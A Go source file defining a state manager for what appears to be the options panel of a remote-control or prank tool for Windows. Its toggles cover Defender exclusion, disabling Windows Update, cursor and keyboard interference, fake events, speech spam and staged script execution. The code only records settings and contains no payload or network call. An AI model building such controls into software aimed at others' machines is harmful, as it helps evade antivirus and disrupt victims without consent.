package options

import (
	"fmt"
	"strconv"
	"strings"
	"sync"
)

type ScriptFile struct {
	Name string
	Size int64
	Type string
}

type ScriptConfig struct {
	File         *ScriptFile
	Mode         string
	Loop         bool
	DelaySeconds int
}

type State struct {
	DefenderExclusion bool
	WindowsUpdate     bool
	VisualDistortion  string
	ScreenOrientation string
	WallpaperMode     string
	CursorBehavior    string
	KeyboardMode      string
	SoundPlayback     bool
	SoundVolume       int
	Script            ScriptConfig
	FakeEventMode     string
	SpeechSpam        bool
	AutoMinimize      bool
}

type Manager struct {
	mu    sync.RWMutex
	state State
}

func NewManager() *Manager {
	return &Manager{
		state: State{
			VisualDistortion:  "None",
			ScreenOrientation: "Normal",
			WallpaperMode:     "Default",
			CursorBehavior:    "Normal",
			KeyboardMode:      "None",
			SoundPlayback:     true,
			SoundVolume:       60,
			Script: ScriptConfig{
				Mode: "Instant",
			},
			FakeEventMode: "None",
		},
	}
}

func (m *Manager) Snapshot() State {
	if m == nil {
		return State{}
	}
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.state
}

func (m *Manager) ApplyOperation(rawOperation string, metadata map[string]any) (string, error) {
	if m == nil {
		return "", fmt.Errorf("options manager not initialized")
	}

	operation := strings.TrimSpace(strings.ToLower(rawOperation))
	if operation == "" {
		return "", fmt.Errorf("missing operation")
	}

	switch operation {
	case "defender-exclusion":
		enabled, err := expectBool(metadata, "enabled")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.DefenderExclusion = enabled
		m.mu.Unlock()
		if enabled {
			return "Windows Defender exclusion enabled", nil
		}
		return "Windows Defender exclusion disabled", nil

	case "windows-update":
		enabled, err := expectBool(metadata, "enabled")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.WindowsUpdate = enabled
		m.mu.Unlock()
		if enabled {
			return "Windows Update enabled", nil
		}
		return "Windows Update disabled", nil

	case "visual-distortion":
		mode, err := expectString(metadata, "mode")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.VisualDistortion = mode
		m.mu.Unlock()
		return fmt.Sprintf("Visual distortion set to %s", mode), nil

	case "screen-orientation":
		orientation, err := expectString(metadata, "orientation")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.ScreenOrientation = orientation
		m.mu.Unlock()
		return fmt.Sprintf("Screen orientation set to %s", orientation), nil

	case "wallpaper-mode":
		mode, err := expectString(metadata, "mode")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.WallpaperMode = mode
		m.mu.Unlock()
		return fmt.Sprintf("Wallpaper mode set to %s", mode), nil

	case "cursor-behavior":
		behavior, err := expectString(metadata, "behavior")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.CursorBehavior = behavior
		m.mu.Unlock()
		return fmt.Sprintf("Cursor behavior set to %s", behavior), nil

	case "keyboard-mode":
		mode, err := expectString(metadata, "mode")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.KeyboardMode = mode
		m.mu.Unlock()
		return fmt.Sprintf("Keyboard mode set to %s", mode), nil

	case "sound-playback":
		enabled, err := expectBool(metadata, "enabled")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.SoundPlayback = enabled
		m.mu.Unlock()
		if enabled {
			return "Sound playback enabled", nil
		}
		return "Sound playback muted", nil

	case "sound-volume":
		volume, err := expectInt(metadata, "volume")
		if err != nil {
			return "", err
		}
		if volume < 0 {
			volume = 0
		}
		if volume > 100 {
			volume = 100
		}
		m.mu.Lock()
		m.state.SoundVolume = volume
		m.mu.Unlock()
		return fmt.Sprintf("Sound volume set to %d%%", volume), nil

	case "script-file":
		fileName, err := expectString(metadata, "fileName")
		if err != nil {
			return "", err
		}
		size, err := expectInt64(metadata, "size")
		if err != nil {
			return "", err
		}
		fileType, _, fileTypeErr := optionalString(metadata, "type")
		if fileTypeErr != nil {
			return "", fileTypeErr
		}
		m.mu.Lock()
		m.state.Script.File = &ScriptFile{Name: fileName, Size: size, Type: fileType}
		m.mu.Unlock()
		return fmt.Sprintf("Script %s staged", fileName), nil

	case "script-mode":
		mode, err := expectString(metadata, "mode")
		if err != nil {
			return "", err
		}
		loop, hasLoop, loopErr := optionalBool(metadata, "loop")
		if loopErr != nil {
			return "", loopErr
		}
		delay, hasDelay, delayErr := optionalInt(metadata, "delaySeconds")
		if delayErr != nil {
			return "", delayErr
		}

		m.mu.Lock()
		m.state.Script.Mode = mode
		if hasLoop {
			m.state.Script.Loop = loop
		}
		if hasDelay {
			if delay < 0 {
				delay = 0
			}
			m.state.Script.DelaySeconds = delay
		}
		m.mu.Unlock()
		return fmt.Sprintf("Script execution mode set to %s", mode), nil

	case "script-loop":
		loop, err := expectBool(metadata, "loop")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.Script.Loop = loop
		m.mu.Unlock()
		if loop {
			return "Script loop enabled", nil
		}
		return "Script loop disabled", nil

	case "script-delay":
		delay, err := expectInt(metadata, "delaySeconds")
		if err != nil {
			return "", err
		}
		if delay < 0 {
			delay = 0
		}
		m.mu.Lock()
		m.state.Script.DelaySeconds = delay
		m.mu.Unlock()
		return fmt.Sprintf("Script delay set to %d seconds", delay), nil

	case "fake-event-mode":
		mode, err := expectString(metadata, "mode")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.FakeEventMode = mode
		m.mu.Unlock()
		return fmt.Sprintf("Fake event mode set to %s", mode), nil

	case "speech-spam":
		enabled, err := expectBool(metadata, "enabled")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.SpeechSpam = enabled
		m.mu.Unlock()
		if enabled {
			return "Speech spam enabled", nil
		}
		return "Speech spam disabled", nil

	case "auto-minimize":
		enabled, err := expectBool(metadata, "enabled")
		if err != nil {
			return "", err
		}
		m.mu.Lock()
		m.state.AutoMinimize = enabled
		m.mu.Unlock()
		if enabled {
			return "Auto minimize enabled", nil
		}
		return "Auto minimize disabled", nil
	}

	return "", fmt.Errorf("unsupported options operation: %s", rawOperation)
}

func expectBool(metadata map[string]any, key string) (bool, error) {
	value, ok := metadata[key]
	if !ok {
		return false, fmt.Errorf("metadata missing %s", key)
	}
	return coerceBool(value)
}

func optionalBool(metadata map[string]any, key string) (bool, bool, error) {
	if metadata == nil {
		return false, false, nil
	}
	value, ok := metadata[key]
	if !ok {
		return false, false, nil
	}
	coerced, err := coerceBool(value)
	if err != nil {
		return false, false, err
	}
	return coerced, true, nil
}

func coerceBool(value any) (bool, error) {
	switch v := value.(type) {
	case bool:
		return v, nil
	case string:
		trimmed := strings.TrimSpace(strings.ToLower(v))
		switch trimmed {
		case "1", "true", "yes", "on":
			return true, nil
		case "0", "false", "no", "off":
			return false, nil
		}
		return false, fmt.Errorf("cannot interpret %q as boolean", v)
	case float64:
		if v == 0 {
			return false, nil
		}
		if v == 1 {
			return true, nil
		}
		return false, fmt.Errorf("cannot interpret %v as boolean", v)
	default:
		return false, fmt.Errorf("metadata %T cannot be interpreted as boolean", value)
	}
}

func expectString(metadata map[string]any, key string) (string, error) {
	value, ok := metadata[key]
	if !ok {
		return "", fmt.Errorf("metadata missing %s", key)
	}
	str, err := coerceString(value)
	if err != nil {
		return "", err
	}
	if strings.TrimSpace(str) == "" {
		return "", fmt.Errorf("metadata %s cannot be empty", key)
	}
	return str, nil
}

func optionalString(metadata map[string]any, key string) (string, bool, error) {
	if metadata == nil {
		return "", false, nil
	}
	value, ok := metadata[key]
	if !ok {
		return "", false, nil
	}
	coerced, err := coerceString(value)
	if err != nil {
		return "", false, err
	}
	return coerced, true, nil
}

func coerceString(value any) (string, error) {
	switch v := value.(type) {
	case string:
		return v, nil
	case fmt.Stringer:
		return v.String(), nil
	case float64:
		return fmt.Sprintf("%g", v), nil
	case int:
		return fmt.Sprintf("%d", v), nil
	case int64:
		return fmt.Sprintf("%d", v), nil
	case uint64:
		return fmt.Sprintf("%d", v), nil
	case bool:
		if v {
			return "true", nil
		}
		return "false", nil
	default:
		return "", fmt.Errorf("metadata %T cannot be interpreted as string", value)
	}
}

func expectInt(metadata map[string]any, key string) (int, error) {
	value, ok := metadata[key]
	if !ok {
		return 0, fmt.Errorf("metadata missing %s", key)
	}
	return coerceInt(value)
}

func optionalInt(metadata map[string]any, key string) (int, bool, error) {
	if metadata == nil {
		return 0, false, nil
	}
	value, ok := metadata[key]
	if !ok {
		return 0, false, nil
	}
	coerced, err := coerceInt(value)
	if err != nil {
		return 0, false, err
	}
	return coerced, true, nil
}

func coerceInt(value any) (int, error) {
	switch v := value.(type) {
	case int:
		return v, nil
	case int32:
		return int(v), nil
	case int64:
		return int(v), nil
	case uint:
		return int(v), nil
	case uint32:
		return int(v), nil
	case uint64:
		return int(v), nil
	case float64:
		return int(v), nil
	case float32:
		return int(v), nil
	case string:
		trimmed := strings.TrimSpace(v)
		if trimmed == "" {
			return 0, fmt.Errorf("cannot interpret empty string as int")
		}
		parsed, err := strconv.ParseInt(trimmed, 10, 64)
		if err != nil {
			return 0, fmt.Errorf("cannot interpret %q as int", v)
		}
		return int(parsed), nil
	default:
		return 0, fmt.Errorf("metadata %T cannot be interpreted as int", value)
	}
}

func expectInt64(metadata map[string]any, key string) (int64, error) {
	value, ok := metadata[key]
	if !ok {
		return 0, fmt.Errorf("metadata missing %s", key)
	}
	return coerceInt64(value)
}

func coerceInt64(value any) (int64, error) {
	switch v := value.(type) {
	case int:
		return int64(v), nil
	case int32:
		return int64(v), nil
	case int64:
		return v, nil
	case uint:
		return int64(v), nil
	case uint32:
		return int64(v), nil
	case uint64:
		return int64(v), nil
	case float64:
		return int64(v), nil
	case float32:
		return int64(v), nil
	case string:
		trimmed := strings.TrimSpace(v)
		if trimmed == "" {
			return 0, fmt.Errorf("cannot interpret empty string as int")
		}
		parsed, err := strconv.ParseInt(trimmed, 10, 64)
		if err != nil {
			return 0, fmt.Errorf("cannot interpret %q as int", v)
		}
		return parsed, nil
	default:
		return 0, fmt.Errorf("metadata %T cannot be interpreted as int", value)
	}
}
